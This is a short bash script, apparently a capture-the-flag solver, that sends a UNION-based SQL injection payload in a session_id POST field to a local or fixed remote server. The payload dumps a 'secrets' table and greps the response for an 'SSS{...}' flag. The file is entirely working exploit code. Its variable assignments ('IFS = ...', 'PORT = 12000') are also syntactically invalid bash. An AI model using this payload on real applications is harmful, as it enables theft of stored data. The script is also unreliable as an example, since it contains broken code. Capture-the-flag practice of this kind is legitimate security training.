set -euo pipefail
IFS = $'\n\t'

PORT = 12000

case "${1:-}" in
  local)
    url="http://127.0.0.1:${PORT}"
    ;;
  remote)
    url="http://141.85.224.118:${PORT}"
    ;;
  *)
    [[ -n "${1:-}" && -n "${2:-}" ]] || {
      echo "Usage: $0 {local|remote|<host>} [port]"
      exit 1
    }
    url="${1}:${2}"
    ;;
esac
echo "Target URL: $url"

payload="session_id=' UNION SELECT 1, GROUP_CONCAT(0x7c, secret, 0x7c) FROM secrets -- comment"
flag=$(curl -s "$url" --data-raw "$payload" | grep -o 'SSS{[^}]*}')

echo "Flag is $flag"